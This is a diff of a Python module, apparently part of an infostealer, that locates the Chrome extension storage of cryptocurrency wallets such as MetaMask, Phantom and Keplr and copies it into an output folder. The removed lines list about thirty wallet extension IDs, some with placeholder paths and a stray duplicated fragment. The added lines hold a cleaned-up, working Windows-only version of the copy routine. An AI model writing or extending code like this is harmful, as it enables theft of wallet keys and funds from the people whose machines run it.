@@ -1,55 +1,60 @@
 import os
+from pathlib import Path
+import shutil
 
-ChromeWalletsDirectories = [
-    ["Chrome_Binance", Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjp"],
-    ["Chrome_Bitapp", Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fihkakfobkmkjojpchpfgcmhfjnmnfpi"],
-    ["Chrome_Coin98", Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\aeachknmefphepccionboohckonoeemg"],
-    ["Chrome_Equal", Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\blnieiiffboillknjnepogjhkgnoapac"],
-    ["Chrome_Guild", Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nanjmdknhkinifnkgdcggcfnhdaammmj"],
-    ["Chrome_Iconex", Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\flpiciilemghbmfalicajoolhkkenfel"],
-    ["Chrome_Math", Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\afbcbjpbpfadlkmhmclhkeeodmamcflc"],
-    ["Chrome_Mobox", Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fcckkdbjnoikooededlapcalpionmalo"],
-    ["Chrome_Phantom", Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa"],
-    ["Chrome_Tron", Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\ibnejdfjmmkpcnlpebklmnkoeoihofec"],
-    ["Chrome_XinPay", Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\bocpokimicclpaiekenaeelehdjllofo"],
-    ["Chrome_Ton", Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nphplpgoakhhjchkkhmiggakijnkhfnd"],
-    ["Chrome_Metamask", Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"],
-    ["Chrome_Sollet", Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fhmfendgdocmcbmfikdcogofphimnkno"],
-    ["Chrome_Slope", Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\pocmplpaccanhmnllbbkpgfliimjljgo"],
-    ["Chrome_Starcoin", Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\mfhbebgoclkghebffdldpobeajmbecfk"],
-    ["Chrome_Swash", Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\cmndjbecilbocjfkibfbifhngkdmjgog"],
-    ["Chrome_Finnie", Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\cjmkndjhnagcfbpiemnkdpomccnjblmj"],
-    ["Chrome_Keplr", Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\dmkamcknogkgcdfhhbddcghachkejeap"],
-    ["Chrome_Crocobit", Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\pnlfjmlcjdjgkddecgincndfgegkecke"],
-    ["Chrome_Oxygen", Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fhilaheimglignddkjgofkcbgekhenbh"],
-    ["Chrome_Nifty", Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\jbdaocneiiinmjbjlgalhcelgbejmnid"],
-    ["Chrome_Liquality", Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\kpfopkelmapcoipemfendmdcghnegimn"],
-    ["Chrome_TrustWallet", Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\newtrustwalletpath"],
-    ["Chrome_Exodus", Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\newexoduspath"],
-    ["Chrome_Coinbase", Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\newcoinbasepath"],
-    ["Chrome_Trezor", Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\newtrezorpath"],
-    ["Chrome_Ledger", Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\newledgerpath"]
-]
-    ["Chrome_Liquality", Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\kpfopkelmapcoipemfendmdcghnegimn"]
-]
+# ---- GLOBAL STATE ----
 
-def get_chrome_wallets(save_dir):
-    try:
-        os.makedirs(save_dir, exist_ok=True)
-        for wallet in ChromeWalletsDirectories:
-            copy_wallet_from_directory_to(save_dir, wallet[1], wallet[0])
-        if Counter.BrowserWallets == 0:
-            Filemanager.recursive_delete(save_dir)
-    except Exception as ex:
-        Logging.log("Chrome Browser Wallets >> Failed to collect wallets from Chrome browser\n" + str(ex))
+browser_wallets_count = 0
 
-def copy_wallet_from_directory_to(save_dir, wallet_dir, wallet_name):
-    dir_path = os.path.join(save_dir, wallet_name)
-    if not os.path.exists(wallet_dir):
-        Logging.log(f"Wallet directory does not exist: {wallet_dir}")
+def log(msg):
+    print(msg)
+
+def copy_directory(src, dst):
+    shutil.copytree(src, dst, dirs_exist_ok=True)
+
+def recursive_delete(path):
+    shutil.rmtree(path, ignore_errors=True)
+
+# ---- REAL EXTENSION IDS ----
+
+chrome_wallets_directories = {
+    "Chrome_Metamask": "nkbihfbeogaeaoehlefnkodbefgpgknn",
+    "Chrome_Phantom": "bfnaelmomeimhlpmgjnjophhpkkoljpa",
+    "Chrome_Keplr": "dmkamcknogkgcdfhhbddcghachkejeap",
+}
+
+# ---- FUNCTIONS ----
+
+def get_chrome_wallets(profile_output_dir):
+    global browser_wallets_count
+
+    if os.name != "nt":
+        raise OSError("Windows only")
+
+    os.makedirs(profile_output_dir, exist_ok=True)
+
+    for wallet_name, wallet_id in chrome_wallets_directories.items():
+        wallet_dir = (
+            Path.home()
+            / "AppData" / "Local" / "Google" / "Chrome"
+            / "User Data" / "Default"
+            / "Local Extension Settings"
+            / wallet_id
+        )
+        copy_wallet(profile_output_dir, wallet_dir, wallet_name)
+
+    if browser_wallets_count == 0:
+        recursive_delete(profile_output_dir)
+
+def copy_wallet(profile_output_dir, wallet_dir, wallet_name):
+    global browser_wallets_count
+
+    if not wallet_dir.exists():
         return
+
     try:
-        Filemanager.copy_directory(wallet_dir, dir_path)
-        Counter.BrowserWallets += 1
+        dst = os.path.join(profile_output_dir, wallet_name)
+        copy_directory(wallet_dir, dst)
+        browser_wallets_count += 1
     except Exception as ex:
-        Logging.log(f"Failed to copy wallet {wallet_name} from {wallet_dir} to {dir_path}\nError: {str(ex)}")
+        log(f"{wallet_name} failed: {ex}")
